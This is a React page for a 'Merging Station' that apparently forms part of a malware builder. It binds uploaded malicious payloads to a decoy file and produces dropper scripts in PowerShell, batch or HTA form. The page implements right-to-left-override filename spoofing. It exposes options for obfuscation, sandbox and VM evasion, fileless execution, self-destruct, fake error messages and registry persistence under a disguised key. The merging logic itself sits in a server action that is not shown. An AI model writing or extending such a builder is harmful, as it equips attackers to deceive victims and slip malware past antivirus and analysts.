
'use client';

import { useState } from 'react';
import { useForm, useFieldArray } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { useToast } from '@/hooks/use-toast';
import { Loader2, Binary, FileCode, Shield, Download, Clipboard, Image as ImageIcon, Key, PlusCircle, Trash2, Bot, Link2 } from 'lucide-react';
import { Progress } from '@/components/ui/progress';
import { Form, FormControl, FormDescription, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Badge } from '@/components/ui/badge';
import { mergePayloads } from '@/actions/merge-payload-action';
import { Checkbox } from '@/components/ui/checkbox';
import { Separator } from '@/components/ui/separator';
import { Textarea } from '@/components/ui/textarea';

const formSchema = z.object({
  payloadFiles: z.array(z.any()).refine(files => files?.length > 0 && files.every(f => f?.length === 1), "At least one payload file is required."),
  benignFile: z.any().refine(files => files?.length === 1, "Benign file is required."),
  iconFile: z.any().optional(),
  outputName: z.string().min(1, "Output name is required."),
  outputFormat: z.string(),
  extensionSpoofing: z.boolean().default(false),
  obfuscationType: z.enum(['none', 'xor', 'hex']).default('none'),
  encryptionKey: z.string().optional(),
  useFragmentation: z.boolean().default(false),
  executionDelay: z.string().optional(),
  fileless: z.boolean().default(true),
  showFakeError: z.boolean().default(false),
  fakeErrorMessage: z.string().optional(),
  selfDestruct: z.boolean().default(false),
  enableSandboxDetection: z.boolean().default(false),
  checkCpuCores: z.boolean().default(true),
  checkRam: z.boolean().default(true),
  checkVmProcesses: z.boolean().default(true),
  sandboxAbortMessage: z.string().optional(),
  enablePersistence: z.boolean().default(false),
  installPath: z.enum(['TEMP', 'APPDATA', 'SystemRoot']).default('TEMP'),
  registryKeyName: z.string().optional(),
});

const outputFormats = {
    'ps1': { name: 'PowerShell (.ps1)', extension: 'ps1', disabled: false },
    'bat': { name: 'Batch (.bat)', extension: 'bat', disabled: false },
    'hta': { name: 'HTML Application (.hta)', extension: 'hta', disabled: false },
    'js': { name: 'JScript (.js)', extension: 'js', disabled: true },
    'vbs': { name: 'VBScript (.vbs)', extension: 'vbs', disabled: true },
    'exe': { name: 'Windows Executable (.exe)', extension: 'exe', disabled: true },
    'scr': { name: 'Screensaver (.scr)', extension: 'scr', disabled: true },
    'lnk': { name: 'Shortcut (.lnk)', extension: 'lnk', disabled: true },
};

const StepNumber = ({ number, children }: { number: number, children: React.ReactNode }) => (
    <div className="flex items-center gap-4">
        <div className="flex h-8 w-8 items-center justify-center rounded-full bg-primary text-primary-foreground text-lg font-bold">
            {number}
        </div>
        <CardTitle className="text-lg">{children}</CardTitle>
    </div>
);


export default function MergingStationPage() {
  const [buildLog, setBuildLog] = useState<string[]>([]);
  const [isBuilding, setIsBuilding] = useState(false);
  const [progress, setProgress] = useState(0);
  const [finalOutput, setFinalOutput] = useState<{name: string, content: string, vtScore: string} | null>(null);
  const { toast } = useToast();

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      payloadFiles: [undefined],
      outputName: 'update_installer',
      outputFormat: 'ps1',
      extensionSpoofing: false,
      obfuscationType: 'none',
      encryptionKey: 'netrax',
      useFragmentation: false,
      executionDelay: '',
      fileless: true,
      showFakeError: false,
      fakeErrorMessage: 'The file is corrupt and cannot be opened.',
      selfDestruct: false,
      enableSandboxDetection: false,
      checkCpuCores: true,
      checkRam: true,
      checkVmProcesses: true,
      sandboxAbortMessage: 'This application cannot run in a virtual environment.',
      enablePersistence: false,
      installPath: 'TEMP',
      registryKeyName: 'UpdaterService',
    },
  });

  const { fields, append, remove } = useFieldArray({
    control: form.control,
    name: "payloadFiles"
  });

  const watchObfuscationType = form.watch('obfuscationType');
  const watchShowFakeError = form.watch('showFakeError');
  const watchEnableSandboxDetection = form.watch('enableSandboxDetection');
  const watchFileless = form.watch('fileless');

 const applyExtensionSpoofing = (filename: string): string => {
    const parts = filename.split('.');
    if (parts.length < 2) return filename; // No extension to spoof
    const realExtension = parts.pop() || '';
    const fakeExtension = parts.pop() || '';
    const nameWithoutExt = parts.join('.');
    
    // RLO character
    return `${nameWithoutExt}.${fakeExtension}\u202E${realExtension.split('').reverse().join('')}.txt`;
 };
 
 const handleFormatChange = (value: string) => {
    const format = outputFormats[value as keyof typeof outputFormats];
    if (format) {
        const currentName = form.getValues('outputName');
        const nameParts = currentName.split('.');
        const baseName = nameParts.length > 1 ? nameParts.slice(0, -1).join('.') : nameParts[0];
        form.setValue('outputName', `${baseName}.${format.extension}`);
    }
    form.setValue('outputFormat', value);
 }

 const runBuildProcess = async (values: z.infer<typeof formSchema>) => {
    setIsBuilding(true);
    setBuildLog([]);
    setProgress(0);
    setFinalOutput(null);

    const log = (message: string) => {
        setBuildLog(prev => [...prev, message]);
        setProgress(prev => Math.min(prev + 15, 100));
    };

    try {
        log(`Build started for ${values.payloadFiles.length} payload(s) + ${values.benignFile[0].name}`);

        const payloadFiles = values.payloadFiles.map(fileList => fileList[0] as File);
        const benignFile = values.benignFile[0] as File;

        const payloads = await Promise.all(payloadFiles.map(async (file) => ({
            name: file.name,
            content: await fileToDataUrl(file),
        })));
        
        const benignContent = await fileToDataUrl(benignFile);
        
        log('Files encoded. Sending to server for merging...');
        
        const response = await mergePayloads({
            ...values,
            payloads: payloads,
            benign: { name: benignFile.name, content: benignContent },
        });
        
        if (!response.success || !response.scriptContent) {
            throw new Error(response.error || 'Failed to generate script on the server.');
        }
        
        log(`Dropper script generated successfully (${values.outputFormat}).`);
        if (values.obfuscationType !== 'none') log(`Payloads obfuscated with ${values.obfuscationType.toUpperCase()}`);
        if (values.useFragmentation) log(`Payloads split into fragments.`);
        if (values.fileless) log(`Fileless execution enabled.`);
        else if (values.enablePersistence) log(`Persistence enabled in ${values.installPath} with key '${values.registryKeyName}'`);
        if (values.executionDelay) log(`Execution delayed by ${values.executionDelay} seconds.`);
        if (values.showFakeError) log(`Fake error message enabled.`);
        if (values.selfDestruct) log(`Self-destruct enabled.`);
        if (values.enableSandboxDetection) log('Anti-VM/Sandbox checks enabled.');

        const finalName = values.extensionSpoofing
            ? applyExtensionSpoofing(values.outputName)
            : values.outputName;

        setFinalOutput({ name: finalName, content: response.scriptContent, vtScore: '0/70 (Simulated)' });
        
        log(`Build complete. Output file: ${finalName}`);
        toast({ title: 'Build Successful', description: 'Your dropper script is ready for download.' });

    } catch (e: any) {
      toast({ variant: 'destructive', title: 'Build Failed', description: e.message || 'An unexpected error occurred.' });
      setBuildLog(prev => [...prev, `ERROR: ${e.message}`]);
    } finally {
      setIsBuilding(false);
      setProgress(100);
    }
  };
  
  const fileToDataUrl = (file: File): Promise<string> => {
    return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.onload = () => resolve(reader.result as string);
        reader.onerror = reject;
        reader.readAsDataURL(file);
    });
  }

  const handleDownload = () => {
    if(!finalOutput) return;
    const blob = new Blob([finalOutput.content], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = finalOutput.name;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  return (
    <div className="flex flex-col gap-6">
      <div>
        <h1 className="font-headline text-3xl font-semibold">Merging Station</h1>
        <p className="text-muted-foreground">Craft sophisticated payloads by binding files, applying evasion techniques, and selecting output formats.</p>
      </div>
      
      <Form {...form}>
        <form onSubmit={form.handleSubmit(runBuildProcess)}>
          <div className="grid lg:grid-cols-3 gap-6 items-start">
            <div className="lg:col-span-2 space-y-6">
              
              {/* Step 1: Input Files */}
              <Card>
                <CardHeader><StepNumber number={1}>Input Files</StepNumber></CardHeader>
                <CardContent className="space-y-4">
                  <div>
                    <Label>Malicious Payloads</Label>
                    <div className="space-y-2 mt-2">
                       {fields.map((field, index) => (
                           <FormField key={field.id} control={form.control} name={`payloadFiles.${index}`} render={({ field: { onChange, onBlur, name, ref } }) => (
                               <FormItem>
                                <div className="flex items-center gap-2">
                                  <FormControl><Input type="file" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl>
                                  {fields.length > 1 && <Button type="button" variant="ghost" size="icon" onClick={() => remove(index)}><Trash2 className="h-4 w-4 text-destructive"/></Button>}
                                </div>
                                <FormMessage />
                               </FormItem>
                           )} />
                       ))}
                    </div>
                    <Button type="button" variant="outline" size="sm" className="mt-2" onClick={() => append(undefined)}><PlusCircle className="mr-2 h-4 w-4"/>Add Another Payload</Button>
                  </div>
                  <Separator />
                  <FormField control={form.control} name="benignFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Benign File (Decoy)</FormLabel><FormControl><Input type="file" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormMessage /></FormItem>)} />
                  <FormField control={form.control} name="iconFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Icon File (.ico, optional)</FormLabel><FormControl><Input type="file" accept=".ico" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormDescription className="text-xs">Note: Icon injection is only possible for compiled executables. For scripts, this can be used with a .LNK shortcut wrapper.</FormDescription><FormMessage /></FormItem>)} />
                </CardContent>
              </Card>

              {/* Step 2: Configuration */}
              <Card>
                <CardHeader><StepNumber number={2}>Configuration</StepNumber></CardHeader>
                <CardContent className="grid md:grid-cols-2 gap-4">
                  <FormField control={form.control} name="outputName" render={({ field }) => ( <FormItem><FormLabel>Output File Name</FormLabel><FormControl><Input {...field} /></FormControl><FormMessage /></FormItem> )}/>
                  <FormField control={form.control} name="outputFormat" render={({ field }) => ( <FormItem><FormLabel>Output Format</FormLabel><Select onValueChange={handleFormatChange} defaultValue={field.value}><FormControl><SelectTrigger><SelectValue /></SelectTrigger></FormControl><SelectContent>{Object.entries(outputFormats).map(([key, value])=><SelectItem key={key} value={key} disabled={value.disabled}>{value.name}</SelectItem>)}</SelectContent></Select></FormItem> )}/>
                </CardContent>
              </Card>
              
              {/* Step 3: Evasion */}
              <Card>
                <CardHeader><StepNumber number={3}>Evasion Techniques</StepNumber></CardHeader>
                <CardContent className="grid md:grid-cols-2 gap-6">
                    <div className="space-y-4">
                        <Label className="font-semibold">Crypter / Obfuscation</Label>
                        <FormField control={form.control} name="obfuscationType" render={({ field }) => (<FormItem className="space-y-3"><FormControl><RadioGroup onValueChange={field.onChange} defaultValue={field.value} className="flex flex-col space-y-1"><FormItem className="flex items-center space-x-3 space-y-0"><FormControl><RadioGroupItem value="none" /></FormControl><FormLabel className="font-normal">None</FormLabel></FormItem><FormItem className="flex items-center space-x-3 space-y-0"><FormControl><RadioGroupItem value="xor" /></FormControl><FormLabel className="font-normal">XOR Encryption</FormLabel></FormItem><FormItem className="flex items-center space-x-3 space-y-0"><FormControl><RadioGroupItem value="hex" /></FormControl><FormLabel className="font-normal">Hex Encoding</FormLabel></FormItem></RadioGroup></FormControl><FormMessage /></FormItem>)}/>
                        {watchObfuscationType === 'xor' && (<FormField control={form.control} name="encryptionKey" render={({ field }) => ( <FormItem><FormLabel className="flex items-center gap-2"><Key className="h-4 w-4"/>XOR Key</FormLabel><FormControl><Input {...field} placeholder="Enter encryption key" /></FormControl><FormMessage /></FormItem> )}/>)}
                        <FormField control={form.control} name="useFragmentation" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Enable Payload Fragmentation</FormLabel><FormDescription>Split the payload into smaller chunks.</FormDescription></div></FormItem> )}/>
                    </div>
                     <div className="space-y-4">
                        <Label className="font-semibold">Anti-Analysis</Label>
                        <FormField control={form.control} name="enableSandboxDetection" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Enable Sandbox Detection</FormLabel><FormDescription>Check for VM environments before running.</FormDescription></div></FormItem> )}/>
                        {watchEnableSandboxDetection && (<div className="space-y-3 pl-4 border-l ml-2"><FormField control={form.control} name="checkCpuCores" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><FormLabel className="text-sm font-normal">Check CPU Cores (&lt;= 2)</FormLabel></FormItem> )}/><FormField control={form.control} name="checkRam" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><FormLabel className="text-sm font-normal">Check RAM (&lt; 4GB)</FormLabel></FormItem> )}/><FormField control={form.control} name="checkVmProcesses" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><FormLabel className="text-sm font-normal">Check for VM Processes</FormLabel></FormItem> )}/><FormField control={form.control} name="sandboxAbortMessage" render={({ field }) => ( <FormItem><FormLabel className="text-sm">Abort Message</FormLabel><FormControl><Textarea placeholder="The message to show if a sandbox is detected." {...field} /></FormControl></FormItem> )}/></div>)}
                    </div>
                     <div className="space-y-4 md:col-span-2">
                        <Label className="font-semibold">Dropper Behavior</Label>
                        <div className="grid md:grid-cols-2 gap-4">
                           <FormField control={form.control} name="fileless" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Fileless Execution</FormLabel><FormDescription>Run in memory.</FormDescription></div></FormItem> )}/>
                           <FormField control={form.control} name="selfDestruct" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Self-Destruct</FormLabel><FormDescription>Delete after run.</FormDescription></div></FormItem> )}/>
                           <FormField control={form.control} name="executionDelay" render={({ field }) => ( <FormItem><FormLabel>Execution Delay (seconds)</FormLabel><FormControl><Input type="number" placeholder="e.g., 10" {...field} /></FormControl></FormItem> )}/>
                           <FormField control={form.control} name="showFakeError" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4 h-full"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Display Fake Error</FormLabel></div></FormItem> )}/>
                        </div>
                        {watchShowFakeError && (<FormField control={form.control} name="fakeErrorMessage" render={({ field }) => ( <FormItem><FormLabel>Error Message</FormLabel><FormControl><Textarea placeholder="The file is corrupt..." {...field} /></FormControl><FormMessage /></FormItem> )}/>)}
                     </div>
                </CardContent>
              </Card>

              {/* Step 4: Persistence (Optional) */}
               <Card className={watchFileless ? 'opacity-50' : ''}>
                    <CardHeader><StepNumber number={4}>Persistence (Optional)</StepNumber></CardHeader>
                    <CardContent>
                        <fieldset disabled={watchFileless} className="space-y-4">
                            {watchFileless && <p className="text-sm text-amber-500 text-center -mt-2 mb-2">Persistence requires 'Fileless Execution' to be disabled.</p>}
                            <FormField control={form.control} name="enablePersistence" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Enable Persistence</FormLabel><FormDescription>Add payload to registry to run on system startup.</FormDescription></div></FormItem> )}/>
                             <div className="grid md:grid-cols-2 gap-4">
                                <FormField control={form.control} name="installPath" render={({ field }) => ( <FormItem><FormLabel>Install Location</FormLabel><Select onValueChange={field.onChange} defaultValue={field.value}><FormControl><SelectTrigger><SelectValue /></SelectTrigger></FormControl><SelectContent><SelectItem value="TEMP">%TEMP%</SelectItem><SelectItem value="APPDATA">%APPDATA%</SelectItem><SelectItem value="SystemRoot">%SystemRoot% (Admin)</SelectItem></SelectContent></Select></FormItem> )}/>
                                <FormField control={form.control} name="registryKeyName" render={({ field }) => ( <FormItem><FormLabel>Registry Key Name</FormLabel><FormControl><Input {...field} /></FormControl></FormItem> )}/>
                            </div>
                        </fieldset>
                    </CardContent>
                </Card>

            </div>

            {/* Right Column */}
            <div className="lg:col-span-1 space-y-6">
                <Button type="submit" className="w-full text-lg py-6" disabled={isBuilding}>
                    {isBuilding ? <Loader2 className="mr-2 h-5 w-5 animate-spin" /> : <Binary className="mr-2 h-5 w-5" />}
                    Build Payload
                </Button>

                <Card>
                    <CardHeader><CardTitle className="text-lg">Build Log</CardTitle></CardHeader>
                    <CardContent>
                        <Progress value={progress} className="mb-2 h-2" />
                        <div className="h-96 bg-primary/10 p-2 rounded-md font-mono text-xs overflow-y-auto">
                          {buildLog.map((log, i) => <p key={i} className="animate-in fade-in">{`> ${log}`}</p>)}
                        </div>
                    </CardContent>
                    {finalOutput && (
                      <CardFooter className="flex-col items-start gap-4 border-t pt-4">
                          <div className="flex justify-between w-full items-center">
                              <p className="font-semibold flex items-center gap-2"><FileCode className="h-4 w-4"/>Output:</p>
                              <p className="font-mono text-xs">{finalOutput.name}</p>
                          </div>
                          <div className="flex justify-between w-full items-center">
                              <p className="font-semibold flex items-center gap-2"><Shield className="h-4 w-4"/>VT Score:</p>
                              <Badge variant="destructive">{finalOutput.vtScore}</Badge>
                          </div>
                          <Button onClick={handleDownload} className="w-full"><Download className="mr-2 h-4 w-4"/>Download Dummy File</Button>
                      </CardFooter>
                    )}
                </Card>
            </div>
          </div>
        </form>
      </Form>
    </div>
  );
}

